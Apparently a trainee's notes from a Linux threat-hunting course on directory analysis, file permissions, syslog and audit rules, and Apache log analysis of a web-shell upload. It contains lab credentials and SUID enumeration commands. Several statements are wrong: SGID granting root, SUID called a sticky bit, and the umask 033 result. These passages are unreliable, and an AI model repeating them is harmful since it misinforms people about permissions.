cd /home/trainee/lab
﻿

2. Run the following commands and review their output to determine the identity and behavior of the file named unknown. The next question refers to this step.

(trainee@kali-hunt)-[~/lab] file unknown
﻿

(trainee@kali-hunt)-[~/lab] stat unknown
﻿

(trainee@kali-hunt)-[~/lab] strings unknown
﻿

(trainee@kali-hunt)-[~/lab] readelf -a unknown
﻿

(trainee@kali-hunt)-[~/lab] ldd unknown
﻿

(trainee@kali-hunt)-[~/lab] hexdump -n 100 --canonical unknown

-------------------------------------------------------------------

Linux Directory Analysis
Utilize directory analysis to determine which binary was most recently added to the file system. This analysis may be performed across all files and subfolders in a directory to determine what has recently changed or whether applications and users are abusing misconfigurations to access those directories.

﻿

Conduct Directory Analysis
﻿

Much of directory analysis involves comparing known standard layouts and included or expected files to a modified file system state. If a device is compromised, attackers may hide artifacts in locations that are unlikely to be viewed frequently or where they are lost in the noise of other similar files. Additionally, placing malicious software in one of the protected directories in the system path allows for the file to be executed from anywhere in the system.

﻿

Workflow
﻿

1. In a terminal window in the VM kali-hunt, analyze the following directories and examine the creation times of the files to determine which binaries were most recently added to the protected binary directories. The next question refers to this step.

﻿

/bin
﻿

/sbin
﻿

/usr/bin
﻿

/usr/sbin
﻿
########## M4 L3 ############
############# Linux Permissions ############

File Permissions Overview
To understand how to find and correct any incorrectly assigned Linux permissions, it is important to first understand what the permissions are and what sort of access each permission gives to a file. It is also important to understand each special permission and how it affects the real access a user has to a file.    

﻿

File Ownership
﻿

The Linux Operating System (OS) has three file ownership types — User, Group, and Other — and each has different roles and accesses. For every file in Linux, there can only be one user, one group, and one other, however, ownership types can be in various combinations. It is important to remember that although Linux views everything as a file, in this lesson, a file refers to directories as well. The Linux OS checks each file ownership type in a specific order to determine the proper access to the file or directory. Linux also has specific codes for each file ownership type: u for User, g for Group, and o for Other.

﻿

User
﻿

The User file ownership type is the owner of the file. This is usually the person who created the file, but file ownership can be transferred to other users. This is also the first file ownership type that Linux checks when reading the permissions to a file. 

﻿

Group
﻿

Every user in Linux is part of a certain group or groups. Groups are created to manage Linux environments and provide proper security to them. When a user creates a file that user's primary group becomes the group owner for that file. The group that has ownership over the file can only be changed by the user that has ownership over the file or by a user logged in as root.

﻿

For example, if there are analysts and system administrators in a Linux environment, creating groups to manage saves time and provides security. The analysts do not need to access the same files as the administrators and the same can be said for the administrators. If groups are created, it also saves time because instead of manually adding permissions for each user, they can be added to a group and that group can have specific permissions over a file.      

﻿

Other   
﻿

Other is every user that has access to the Linux system that is not the user or a member of the group that has ownership of that file. This means that anyone with a valid account on the Linux system can access the file with the given permissions that the Other group has. It is vital to control the permissions of the Other file ownership because this can be a security risk if the correct permissions are not assigned.

﻿

Order of Permissions
﻿

When Linux checks permissions, it uses this order:

If the file is owned by the user, the User permissions determine the access.
If the group of the file is the same as the user's group, the Group permissions determine the access.
If the user is not the file owner and is not in the group, the Other permission is used.
If users are denied permission, Linux does not examine the next group.

 ----------------------------------------------------------------

Permission Modes
Every file in Linux has three different permission modes for the three different file ownerships: read, write, and execute. For the Linux permission modes, there is a difference between what read, write, and execute mean for files versus directories. When viewing the permissions on a Linux OS, there are codes for the different permission modes: r for read, w for write, x for execute, and - for permission not granted (rwx-).    

﻿

Read
﻿

For files with read permissions (r), the contents of the file are able to be viewed or copied. The file contents cannot be modified or executed, only viewed. For directories with read permissions, the files within the directory can be listed and copied, but no files can be added or deleted. This means that the ls command can be used to view the files inside the directory but having read permission to a directory does not always mean that the contents of the files can be viewed. 

﻿

Write
﻿

For files with write permissions (w), the contents are able to be modified. Anyone with write permissions for a file can add to the file or even overwrite the file. For users with write permissions for a directory, they can add and delete files from that directory. With write permissions to a directory, files can also be renamed or moved within that directory.

﻿

Execute
﻿

The execute permission mode (x) is the most unique and also complex of the three permission modes. This permission mode is specific to executable binaries and directories. If the file or program is executable, and the user has the execute permission mode, then the file can be run. If the file is a shell script, then adding the execute permission to it tells Linux to treat the file as if it were a program. Users can enter a specific directory using the command cd if they have the execute permission for that directory. The execute permission on directories also affects what level of information can be gained by using the commands ls or find.

﻿

For example, a user who only has read permissions for a directory can only use ls to list the files within a directory. However, a user who has read and execute permissions can use the command ls -al in order to list all of the files, including hidden files, and view other information about the files such as permissions, the owner of the file, file size, and creation date.

﻿

For example, the file myfile has permissions set to read, write, and execute for User (rwx), read and write for Group (rw-), and only read for Other (r–). The permissions for the file are listed as rwxrw-r–. If the file had the permissions set to read and write for the User (rw-), read and write for the Group (rw-), and only read for Other (r–), the permissions appear as rw-rw-r–, with the order of file ownership being User, Group, and Other. Directories also have a symbolic value of d, which is represented before the set of permissions to let users know that it is a directory and not a file. A regular file has a symbolic value of -. 


![image](https://github.com/user-attachments/assets/2dad968d-85f1-4241-b6dc-2670d80c090f)

--------------------------------------------------------------------------

Octal References
Linux permissions can also be viewed or set using octal references instead of the rwx format. This method of specifying permissions can seem more complex at first but is actually easier to set permissions for files. Octal references refer to using octal numbers (digits 0 – 7) to represent each permission mode. Figure 4.3-2 details the reference values and how they are used to determine the permissions for a file or directory.

![image](https://github.com/user-attachments/assets/af720fd6-37dc-47e0-8a30-d30a8109d427)

Read permissions use the number 4, write permissions use the number 2, and execute uses the number 1. The octal numbers representing each permission are added together to specify which permissions are given out to each file ownership type.  


For example, the command chmod 444 myfile sets the permissions of myfile to read (4) for User, Group, and Other. The first number in the command above represents the User file ownership, the second number is the Group, and the third number is the Other. 


The command chmod 644 myfile sets the permissions of myfile to User can read and write (4+2=6), Group can read (4), and Other can read (4) myfile. The command chmod 604 myfile sets the permissions to User can read and write (6), Group can do nothing (0), and Other can read (4) myfile. Lastly, the command chmod 777 myfile gives each file ownership type read, write, and execute permissions to myfile (4+2+1=7). This is the least restrictive permission and is considered dangerous by system administrators.


Linux Permissions Mask


When a user creates a file or directory, it is created with a default set of permissions. For example, if a new file was created and given the default permissions of 666, then read and write permissions (rw-rw-rw-) have been granted to everyone. Similarly, if a directory was created with the default permissions of 777 (rwxrwxrwx), then anyone can change the contents of the file because all users on the system have search access to the directory and write access to the file. This situation can be avoided by setting the umask value.


By default, files receive the rw-rw-rw- (666) permissions and directories receive rwxrwxrwx (777) permissions when they are created. This often leaves situations where excess permissions are given out. The umask command specifies the permissions to be subtracted from the default permissions when files and directories are created. For example, if 022 was subtracted from 777 for directories or 666 for files it would create directories with the permissions 755 (drwxr-xr-x) or files with 644 (rw-r–r–). 


The default value for umask is 022 or 002 depending on the Linux distribution used. The umask value is subtracted from the default permissions after new files or directories are created. The command umask 066 results in file permissions of rw------- (600) and directory permissions of rwx–x–x (711). A umask of 033 results in file permissions of rw–wx-wx (633) and directory permissions of rwxr–r– (744).

------------------------------------------------------------------

Unique Permissions
The Linux OS has unique permissions that can be set on files or directories to give that file or directory different characteristics. These special permissions allow users to run certain applications with other credentials, control how groups inherit permissions, and can keep files from being deleted or changed accidentally. Linux also has the ability to implement Access Control Lists (ACL) to allow administrators to define permissions for more than just one user or group.

﻿

Sticky Bit
﻿

A sticky bit is a special permission set on a file or an entire directory. It grants only the owner (User) of a file or directory the permission to delete or make changes to that file or directory contents. No other user can delete or modify the file or directory. It has the symbolic value of t and a numeric value of 1000. This special permission ensures that important files or directories are not accidentally deleted or modified.


![image](https://github.com/user-attachments/assets/164704c1-d672-48b4-be09-d1122adb0166)


The sticky bit also has a different meaning when applied to directories than when applied to files. If the sticky bit is set on a directory, a user may only delete files within that directory that they own or for which they have explicit write permissions granted to that file, even when they have write access to the directory. This is designed for directories like /tmp, to which all users have write permissions, but it may not be acceptable to allow any user to delete files at will within the directory. 


Set User Identifier Bit


The Set User Identifier (SUID) bit replaces the execute permission to allow programs to run with the permissions of the file owner, not with the permissions of the user who runs the program. The most common use of the SUID bit is to allow users to run a command as the root user. Users do not become the root user, however, the command or program is run with root user permissions. Some programs require the SUID bit to be set to properly function, however, it should be used sparingly as it can be a security issue if used incorrectly. The SUID permission has the symbolic value of s in the first set of permissions for the User and a numerical value of 4000. Any file highlighted in red signifies that there is a SUID sticky bit set on it. Notice in Figure 4.3-4 that myfile has a sticky bit set. 

![image](https://github.com/user-attachments/assets/7b7cf394-33c9-4ffd-bece-c41eead42b53)

Set Group Identifier Bit


The Set Group Identifier (SGID) bit is similar to the SUID bit in that it replaces the execute permissions for a program or directory. However, for a file, the program runs with the group permissions of the group owner. This allows all members of a group to execute the file with root permissions. For a directory, a newly-created file receives the same group owner as is assigned to the parent directory. This is often used to allow all users to write to a specific directory. The SGID bit has a symbolic value of S and a numeric value of 2000. It is present in the second set of permissions for the Group file ownership. Figure 4.3-5 shows the SGID sticky bit set for myfile.


![image](https://github.com/user-attachments/assets/be098561-2864-4f8b-aff8-81fb2404eab3)


Mutability


In situations where there are certain configuration files or other important files that need to be write-protected, the command chattr makes a file immutable, which is the best way to protect these files. While changing the ownership or permission bits on the file can also protect them, it cannot prevent any actions from being done with root privileges. This is where chattr can be used. Similar to chattr is lsattr, which shows the attributes set on a file. 


The command chattr allows attributes to be set or unset on a file that are separate from the standard file permissions. Available attributes that can be set using chattr include the following:
a: Can be opened in append mode only.
A: Do not update time (file access time).  
c: Automatically compressed when written to disk.
C: Turn off copy-on-write.
i: Set immutable.
s: Securely deleted with automatic zero.

To make a file immutable, the i attribute is added. For example, to write-protect the /etc/passwd file, the command is:
sudo chattr +i /etc/passwd



To set or unset the immutable attribute sudo privileges must be used. With the immutable attribute set, the file cannot be tampered with. To edit the file, the attribute needs to be removed with the command:
sudo chattr -i /etc/passwd

--------------------------------------------------------------------------

Viewing File Permissions
There are multiple different ways to view the permissions on a file or directory on a Linux OS. The most popular command, and by far the most simple way to view permissions, is to use the ls command. The command namei is also useful. This command views information, such as permissions, for directories and files within a given path. It is useful when troubleshooting permissions errors or when trying to determine if the proper access is applied to a specific file or directory.

﻿

Viewing Permissions with the Command ls
﻿

The command ls is used to view a long listing of files and directories in the current directory. For example, if an analyst is in the /home/trainee directory and inputs the command ls, the output includes a list of the directories that exist within /home/trainee and any files that have been created. The command ls can also be used with a pathname to list the directory contents and permissions of directories outside the present working directory. The command ls -l /var/www/html/ lists the permissions of all the files or directories within the /html/ directory.  


![image](https://github.com/user-attachments/assets/9ac02fa1-38e1-4738-a8b2-56806104f600)


There are other ways that ls is used to view more detailed information such as the permissions and file owners. The command ls -l returns an output with detailed information about the permissions for each directory and file that exists within the present working directory. The command ls -al returns the same output and includes any hidden files that exist within the present working directory. 

![image](https://github.com/user-attachments/assets/95923b4e-0d97-4a03-a278-c87b61774710)

Figure 4.3-7 shows the permissions for all the directories and files within the /home/trainee directory. Looking at the permissions for the Desktop directory, it has the octal permissions of 755 which appear as drwxr-xr-x. As a reminder, the d stands for the directory, the rwx (read, write, execute) represent the permissions for the User file ownership, the r-x (read, execute) represent the permissions for the Group file ownership, and the r-x (read, execute) represent the permissions for the Other file ownership. 


The octal permissions for the file myfile are 644 or -rw-r–r–. The first - represents a file instead of a directory. The rw- (read, write) represent the permissions for the User file ownership, the r– (read) represents read-only permissions for the Group file ownership, and the r– (read) represent read-only permissions for the Other file ownership type.


Viewing Permissions with the Command namei


The command namei is used to view more information about the directories that exist within a path. It can be used to view the permissions, owner, or creation date of directories or files. The namei command uses pathnames as arguments so the syntax to view the permissions for a given pathname looks similar to:
 namei -l /home/trainee/Downloads



That output returns the permissions and file owner for all the directories listed in the path name. 

![image](https://github.com/user-attachments/assets/b85745df-e5c7-41e0-a1c4-b0222ba1bdd8)


Viewing File Permissions


Identify file permissions of several different files using the commands learned. 


Workflow


1. Log in to the Virtual Machine (VM) kali-hunt using the following credentials:
Username: trainee
Password: CyberTraining1! 



2. Open a terminal console.


3. Run the following code to change directories:
cd lab



4. Run the following code to view the files within the lab directory:
ls



5. Run the following code to view the file permissions and file owner of the file myfile:
ls -l myfile



This file has the permissions read, write, execute for User, read and execute for Group, and read for Other.


6. Run the following command to view the permissions for both files within the lab directory:
ls -l



7. Look at the permissions for the file project. It has read, write, and execute permissions for all three file ownership types. This is considered the least secure type of permission, and this file is considered insecure.


8. Run the following commands to create a file, and look at the default permissions for that file:
touch myfile2
ls -l myfile2



The default permissions for any newly-created files for this system are read and write for User, read for Group, and read for Other. 


9. Run the following command to change to the home/trainee/analyst directory:
cd ../analyst

---------------------------------------------------

Securing Linux Files
There are a number of different commands that Linux offers in order to modify the permissions of a file or directory. These include chmod, chown, and chgrp. Each serves a specific purpose when modifying permissions for a file or directory. For each of these commands, utilize Table 4.3-1 to set the correct permissions.

![image](https://github.com/user-attachments/assets/1190d507-2d65-4bb3-8adc-242719069193)

chmod


The chmod command changes permissions for a specified file. It adds or subtracts permissions from a file, and is used to explicitly set the permission value for a file equal to the specified permissions. There are two ways to set the permissions, octal and symbolic (r,w,x).


The following are the different syntaxes that can be used with chmod.


chmod (file ownership)+(permission)
Adds a permission. The following command adds the execute permission to the file myfile for the User, Group, and Other:
chmod u+x,g+x,o+x myfile



chmod (file ownership)-(permission)
Subtracts permissions. The following command subtracts the write permissions from the Group and Other for myfile but leaves the User permissions untouched:
chmod g-w,o-w myfile



chmod (file ownership)=(permission)
Sets the permission equal to the permission specified for a User, Group, or Other for a file or directory. The following command sets the User permissions for the file myfile to read, write, and execute:
chmod u=rwx myfile



chmod (octal number)
Sets the permissions explicitly to what is represented with the octal reference numbers. The following command sets the permissions of myfile to User read, write, and execute (7) and Group and Other to execute (1):
chmod 711 myfile



chown and chgrp


The chown command is used to alter the User and Group ownership of files and directories. This command changes ownership of a directory recursively throughout the directory tree, or it can change the Group ownership to a single file or directory. This command is frequently used in environments where files need to be shared in a specific group. 


To only change the User file ownership, the command is:
chown trainee myfile



This sets the User file ownership of the file myfile to the user trainee. If a colon is used after the username, the Group ownership of the file is changed as well. The following command makes trainee the User owner and analyst the Group owner of the file logs:
chown trainee:analyst /project/logs



The commands chown and chgrp change the Group ownership and are used to recursively change the Group ownership of a file or directory throughout a directory tree. The following command sets the analyst group as the owner of all files within the /project directory:
chown :analyst -R /project



The following command makes the analyst group the owner of the file logs:
chgrp analyst /project/logs


------------------------------------------------------------------


Common Permissions Misconfigurations
When a user is given a permission setting that provides access to a wider range of files than is required, this can lead to the exposure of sensitive information or the unintentional modification of files. This is particularly dangerous when users have access to program configuration files or important executables. Not only can a user unintentionally modify these files but adversaries can exploit weak permissions on files that are set to world-readable or readable by anyone with access to the system. 

﻿

For example, the default permissions for home directories is 755, which means that users who have access to the system can view the contents of other home folders. Some users may have scripts or backups of files in their home folders that contain sensitive information.

﻿

Other commonly misconfigured files include the following:

Bootloader Configuration Files
System and Daemon Configuration Files
Firewall Scripts
Web Service
Web files/directory
Configuration files/directory
Sensitive files (encrypted data, password, key)/directory
Log files (security logs, operation logs, admin logs)/directory
Executables (scripts, EXE, Java Archive [JAR], class, Hypertext Preprocessor [PHP], Active Server Pages [ASP])/directory
Database files/directory
Temporary files /directory
Upload files/directory
﻿--------------------------------------------------------

 
Conducting File Permissions Audit
The Linux find command is useful to find specific files based on the criteria added to the command. It is used to find specific filenames, permissions, users, file types, etc. The find command locates permissions that are set incorrectly and performs an audit on a file system. 

﻿

World-Writable Files
﻿

World-writable files are files that anyone who has access to the Linux system has write permissions to. One of the main causes of world-writable files is incorrect default permissions for new files and folders. This can be fixed by setting a correct umask of 002. However, to ensure there are no files with incorrect permissions, an audit should be performed to check for these files. This can be done using the find command.

﻿

The command to search for world-writable files is: 

find /dir -xdev -type f -perm -0002 -ls
﻿

The /dir is the directory that should be searched. This lists any files that meet the requirements specified, which is in this case, the Other file ownership type having write permissions. To disable world-writable access to a file, the chmod command is used. chmod o-w myfile removes writable access for Other to the file myfile.    

﻿

Incorrect SUID Permissions
﻿

An incorrectly assigned sticky bit is dangerous because it allows anyone to potentially run a file as a root user. If a file is owned by the root and has the SUID bit set, then it runs with root user permissions. If an adversary compromises a system and comes across a file with root permissions, it can use the file to perform remote commands on the system with root-level permissions. These files can be audited, similarly to how world-writable files were found.

﻿

The command to search for an incorrectly assigned SUID bit is:

find /dir -uid 0 -perm -4000 -type f 2>/dev/null | xargs ls -la
﻿

The /dir can be replaced with the directory that should be searched. This command can also be edited to check for an incorrectly assigned SGID bit. The following command finds any SGID bits that are incorrectly assigned:

find /dir -group 0 -perm -2000 -type f 2>/dev/null | xargs ls -la
﻿

Find and Correct the Incorrect File Permissions
﻿

Use the information learned to find and set file permissions that were incorrectly set on a system critical file within the /etc directory. Use sudo to search the /etc directory. Once the file is located, set the permissions to read and write for User, read for Group, and none for Other.     


########## M4 L4 ############
############# Syslog and Auditlog ############

Linux Logging Basics
Linux OSs collect a wide array of technical information and data regarding the host. The collected data contains information on a wide variety of categories, such as communications sent and received or user actions. The logs allow security and engineers on the hosts to see nearly every action performed on the OS. 

﻿

Common Logs for Linux
﻿

Analysts should be familiar with the following common logs for Linux:

System logs

Audit logs

Log directories

﻿

System Logs﻿

﻿

The syslog protocol, as defined by RFC 3164, provides a means to send event notifications across IP networks to event message collectors. The event message collectors are referred to as syslog servers. Syslog enables the collection of Linux device data such as statuses, events, and diagnostics. The messages developed by syslog provide status information about the host over a period of time. 

﻿

Audit Logs﻿

﻿

The Linux Audit system is a framework and a kernel feature that provides audit logs. Audit logs are developed specifically for security-related events and actions. The audit logs can be used by security analysts to review and monitor system actions with the goal to identify suspicious activity. A key component of audit logs is the feature which enables users to develop and configure rules that have defined parameters. The auditing rules can be written to collect information regarding system calls, access to a specific file, or authentication events. 

﻿

Log Directories﻿

﻿

By default, Linux log files are stored in plain text files within specified directories on the host. Table 4.4-1, below, displays the default Linux directories and the information collected in each.


![image](https://github.com/user-attachments/assets/703aa7f9-60b3-4bc1-8ba0-ee181f82ecd0)

----------------------------------------------------

Syslog Basics
The syslog protocol provides devices a means to send messages across networks to message collectors. Syslog has been used for decades as a reliable log collection framework for Linux and Unix OSs. 

﻿

Layers
﻿

Syslog contains three layers that help define the content within messages, their encoding and storage, and how they are transported. These layers are presented in Figure 4.4-1, below:

﻿![image](https://github.com/user-attachments/assets/abfe8b5b-50f5-4bea-8933-dde96bc21ddd)


 Severity and Facility Codes 


Severity codes indicate the priority and importance of each message. Table 4.4-2, below, displays syslog severity codes and is viewable within the console by executing the following command:
man syslog

![image](https://github.com/user-attachments/assets/57438138-a4a5-4168-9aae-06a7e2499db9)

The severity code and the severity name are synonymous within the Linux command line. The two commands below execute the same commands, regardless of whether the severity code or severity name is entered. 


iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-level informational --log-prefix "ping"



iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-level 6 --log-prefix "ping"



Facility codes indicate where and how to store the message on the syslog server. The facility code architecture organizes and keeps the syslog server searchable. Table 4.4-3, below, displays the syslog facility codes:

![image](https://github.com/user-attachments/assets/d7707bcd-707d-4540-94d4-1e07f5cea6df)

Format


Syslog contains a standard format usable with all devices and applications. This format is  Figure 9.4-2, below, highlights the three sections of syslog’s format in a syslog entry. In the illustration, the sections are labeled numerically, as follows:
Header
Structured data
Message

The header (1) contains information regarding the Facility, Version, Time, Date, Host Name, Application, Process Identifier (ID), and Message ID. The image below shows the header and the information that composes it. The header comprises only the information preceding the structured data fields.


The structured data section (2) includes the fields Structured-Data and Encoding. Logs can be encoded in different structures, so the structured data comprises how the data is formatted. Most syslog messages are encoded using 8-bit Unicode Transformation Format (UTF-8), however, this can be adjusted based on the needs of the message.


The message section (3) includes everything following the Encoding field. The Message field contains information about the syslog entry. The message contains details pertaining to why the specific entry was recorded. One example of data contained in the message field is a failed logon attempt, as presented in the figure below.

![image](https://github.com/user-attachments/assets/834129a1-7535-4baa-8e5b-8bb67885613b)

NOTE: The syslog file format is customizable and may differ from the standard format due to configurations defined in /etc/rsyslog.conf or /etc/rsyslog.d/, altering timestamp, metadata, or message structure to suit logging needs. This customizability allows for flexibility to adapt to specific logging requirements.
----------------------------------------------------------------------

Access and View Syslog

The Linux OS collects logs based on activity that occurs on the host. In the lab below, use the Linux Command Line Interface (CLI) to access and view syslog files on a Linux host. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open Terminal Emulator.

﻿

3. Enter the following command to access root privileges on the host:

$ sudo su
﻿

4. When prompted, enter the password for the user trainee:

Password: CyberTraining1! 
﻿

5. Enter the following command to access the log directory:

(root@kali-hunt)-[~] # cd /var/log/
﻿

6. Enter the following command to view the log directory:

(root@kali-hunt)-[/var/log] # ls
﻿

Step 6 returns the files within the directory, as displayed below in 

![image](https://github.com/user-attachments/assets/126a96a2-0595-4b29-9d31-4253b706ef98)

The directory /var/log/ stores the log files on a Linux host. The syslog directory handles the syslog files collected on the host. There are many command options to view the log files. 


7. Enter the following command to view the log directory:
(root@kali-hunt)-[/var/log] # less syslog



The command less is a tool in the Linux OS that displays only the content of the file one page at a time. This command works well for large files where the information being viewed is most recent in the file. 


8. To exit less, enter the following command:
:q



9. Enter the following command to view the log directory:
(root@kali-hunt)-[/var/log] # tail syslog



The command tail is a tool in Linux that is well-suited to view log files. This command displays the last 10 lines of a file, making large log files viewable in a manageable way.

---------------------------------------------------------------

Audit Basics
The Linux Audit system collects data across multiple categories based on defined rules. Each rule defines which data to collect and what categories to place it in. The Linux Audit log categories and rules are described below.

﻿

Audit Log Categories
﻿

The Audit system collects data across the following three categories:


System calls: The data identifies which system calls were called, along with contextual information such as the arguments passed to it and user information.
File access: This is an alternative way to monitor file access activity, rather than directly monitoring the open system call and related calls. 
Select: These are pre-configured auditable events within the kernel.

Audit Log Rules
﻿

The data that the Audit system collects is based on a specified set of rules. The rules used by the Audit system define what data is captured and how it is handled. The command auditctl allows users to control the Audit system and implement new rules for the host. The rules are categorized into the following categories:


Control: Audit's system and user behaviors. 
File system or File watches: Audit's access or usage of a file or directory.
System call: Audit's system calls on specified programs. 
﻿--------------------------------------------------------------------
iew and Create Audit Rules
Linux Audit System Overview 
﻿

The Linux Audit system collects logs that include data pertaining to the type of events, the date and time, system calls, files accessed, and processes used. The system contains rules that can be viewed, created, and modified. The next workflow introduces methods to use the Linux Audit system. 

﻿

View Audit Rules and Status
﻿

The Linux Audit system includes rules that dictate what activity is logged. Complete the following workflow to view the rules and the current status of the Linux Audit system.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open Terminal Emulator.

﻿

3. To view the audit rules enter the following command:

(trainee@kali-hunt)-[~] $ sudo auditctl -l
﻿

4. When prompted enter the password for trainee:

CyberTraining1!
﻿

The command -l in step 3 lists all rules that are on the host. It returns the following output:

No rules
﻿

NOTE: This workflow frequently employs the command sudo. Enter the password from step 4, each time the prompt requests it.

﻿

5. Check the status of the Audit system by entering the following command:

(trainee@kali-hunt)-[~] $ sudo auditctl -s
﻿

The command -s lists the status of the Audit system on the host. The top line of the output, enabled 1, indicates that the Audit system is active. If the system is not active, a value of 0 is returned.

﻿

Create a Filesystem Audit Rule
﻿

Continue working in the VM kali-hunt to complete the next workflow. This workflow explores commands to create audit rules based on the filesystem of the host. 

﻿

The following syntax is used to create audit rules:

auditctl -w <path to file> -p <permissions> -k <key name>
﻿

This syntax includes the following elements:

<path to file> is the file or directory that requires auditing.

<permissions> are the permissions that are logged. The values can include r (read), w (write), and a (attribute change). 

<key name> is a string value that allows the user to input text that may help identify the rule. 

Workflow
﻿

1. Open Terminal Emulator.

﻿

2. To create a filesystem rule, enter the following command:

(trainee@kali-hunt)-[~] $ sudo auditctl -w /etc/hosts -p wa -k hosts_file_change 
﻿

The rule audits write and attribute change to anything in the file /etc/hosts. Any change to the file hosts is logged to the audit log with the key name hosts_file_change.

﻿

3. To ensure the rule is in place, enter the following command:

 (trainee@kali-hunt)-[~] $ sudo auditctl -l
﻿

Step 3 returns the following output, which indicates the rule was successfully added to the Linux Audit system:

-w /etc/hosts -p wa -k hosts_file_change 
﻿

4. To ensure the rule is enforced and works as expected, navigate to the following path:

(trainee@kali-hunt)-[~] $ sudo vi /etc/hosts
﻿

5. Select i to insert text to the file. 

﻿

6. On a new line, enter the following:

New Text
﻿

7. Save the text by entering the following command:

:wq!
﻿

8. To confirm the rule is collected query the Audit log with the following command:

(trainee@kali-hunt)-[~] $ ausearch -k hosts_file_change
﻿

The command ausearch allows users to query the Audit log by defined parameters. The query above searches the Audit log for any occurrences of hosts_file_change. Audit logs can be very large, making manual review of the log a nearly impossible task. The command ausearch enables quick and efficient review and discovery of Audit log information. 

﻿

Output from the query is similar to Figure 4.4-4, below, although the exact output differs slightly. Each occurrence of the rule is separated by a line. Within the rule exists information pertaining to the time and date the event occurred, the path of the file, the Process Identifier (PID), and the Parent Process Identifier (PPID). 

﻿![image](https://github.com/user-attachments/assets/4a43274d-52ce-4321-95b8-17aab57dd698)


---------------------------------------------------------------------------------


Analyze Logs
Read the following scenario. Then, use the skills and information from this lesson to complete the workflow.

﻿

Scenario 
﻿

A Cyber Protection Team (CPT) has been assigned a mission within the Virtual City (vCity) University network. The primary object of the mission is to execute analysis of collected Apache logs from the university's web server. The vCityU web server provides facility, staff, and students access to university services and infrastructure. A portion of the vCityU web server experienced unusual activity where text appeared on the hosted site that was not placed by a university official. As a result of the incident, vCityU has taken down the web server and pulled the logs from it. vCityU requires an analysis and review of their logs. The log file includes server requests made from a user on February 28, 2022. The log files have been uploaded to the VM kali-hunt for review and analysis. 

﻿

The apache logs contain Hypertext Transfer Protocol (HTTP) response status codes, indicating the status of an HTTP request. Table 4.4-4, below, provides the HTTP response status codes contained in the vCityU logs:

![image](https://github.com/user-attachments/assets/775bfb4d-56de-463d-b812-84f90958109e)

The apache logs files follow the format listed in Table 4.4-5, below:

![image](https://github.com/user-attachments/assets/956b668d-8120-42a0-98f7-f30ab3357326)


he log syntax is as follows:
LogFormat "%v %h %l %u %t \"%r\" %>s %b" vhost_common

The format specifiers are:
%v: Virtual host serving the request.
%h: Remote host's IP address.
%l: Remote logname, identd.
%u: Userid of the user making the request.
%t: Time the request was received in the format [day/month/year:hour:minute:second zone].
\"%r\": Request line as the HTTP request method, path, and protocol.
>%s: HTTP status code returned to the client.
%b: Size of the response in bytes, excluding the HTTP header.

The following is an example of a log entry:
77.54.21.11 - - [12/Dec/2018:05:03:34 +0100] "GET /vcityu/student/documents.php?file=220.php&theme=twentysixteen HTTP/1.1" 200 4291 



This example includes the following elements:
Client IP address: 77.54.21.11
Time stamp: 12/Dec/2018:05:03:34 +0100
Type of request
Method: GET
Resource: /vcityu/student/documents.php?file=220.php&theme=twentysixteen
Protocol: HTTP/1.1

HTTP response code: 200
Bytes sent: 4291

NOTE: When a log contains unknown or undefined information, "-" is placed where the information occurs. 


Workflow


1. Log in to the VM kali-hunt using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open Terminal Emulator.


3. Access the log file, located on the following path:
(trainee@kali-hunt)-[~] less /var/log/apache2/feb28_logs.log.1



Analyze the log file to answer the next set of questions.


Username
The following log entry includes unknown or undefined information. The dash "-" indicates unknown or undefined information, so in this case the username is not known or defined in the log. 

﻿

71.55.82.68 - - [28/Feb/2022:09:02:23 +0100] "GET /student/vcityu-login.php HTTP/1.1" 200 1568 "-"
﻿
HTTP Response Code 302
The following log entry includes the first occurrence of HTTP response code 302. HTTP response code 302 indicates that the URI of the requested resource has been changed temporarily, therefore the response is redirected.

﻿

71.55.82.68 - - [28/Feb/2022:09:02:46 +0100] "POST /student/vcityu-login.php HTTP/1.1" 302 1150 "http://www.vcityu.com/student/vcityu-login.php"
﻿----------------------------------------------------------------

 Attack Analysis
The logs contain information regarding a malicious attack to the vCityU web server. It was determined that the file r57.php is malicious and associated with the attack. The file likely included a large amount of bytes to upload to the server. Using this information, answer the next set of questions.

Bytes Uploaded
The following log entry contains 12459 bytes sent. The large number of bytes relative to the other logs, paired with its location, prior to any log containing r57.php, indicates this is likely the log of the malicious file upload.

﻿

71.55.82.68 - - [28/Feb/2022:09:05:41 +0100] "GET /vcity/student/plugin-install.php HTTP/1.1" 200 12459 "http://www.vcityu.com/victyu/student/plugin-install.php?tab=upload"

--------------------------------------------------------------------------

![image](https://github.com/user-attachments/assets/90a76d67-5c91-4f99-80a9-fa138620cb83)

![image](https://github.com/user-attachments/assets/075d4a27-9953-4d69-a5bf-227f2eb49eaf)

yellow is correct and orange is not correct  showed up before just not how i expected it to.

First Occurrence
The following log entry includes the first occurrence of r57.php:

﻿

71.55.82.68 - - [28/Feb/2022:09:10:563 +0100] "GET /vcityu/student/admin-ajax.php?action=connector&cmd=upload&target=l1_d3AtY29udGVudA&name%5B%5D=r57.php&FILES=&_=1460873968131 HTTP/1.1" 200 731 "http://www.vcityu.com/victyu/student/admin.php?page=file-manager_settings"
﻿

Summary
﻿

All logs are different, so the CPT reviews syntax, fields, and descriptions prior to analysis. By using the vCityU apache web server logs, the CPT identifies relevant information to an investigation. They determine the timing of the logs, the client IP address, a nd the time the first occurrence of the malicious file, r57.php, was note d. 


########## M5 L1 ############
############# Linux Internals ############

Directories for Internals
All Linux distributions use a standard directory tree as the file structure. These directories are included under the root directory, as displayed in Figure 5.1-1, below. This lesson focuses on /proc, /etc, and /boot because these are the main Linux directories that contain the internals necessary for a running Linux system. Each of these directories has a specific and important purpose. The information within these directories can be used by an analyst during a hunt in order to gain insight into the inner workings of a Linux system.

﻿
![image](https://github.com/user-attachments/assets/25254e9f-b62e-4dda-855f-f8d409f6de01)

The directory /proc contains information about currently running processes and kernel parameters. The content within /proc is used by a number of tools to get vital system statistics and runtime system information. For example, the file /proc/cpuinfo has the information necessary to check processor information in Linux.


The directory /etc contains the core configuration files of the system. It is primarily used by administrators and Linux services and contains information such as the password and networking files. Most changes that are made to system configurations occur within /etc. 


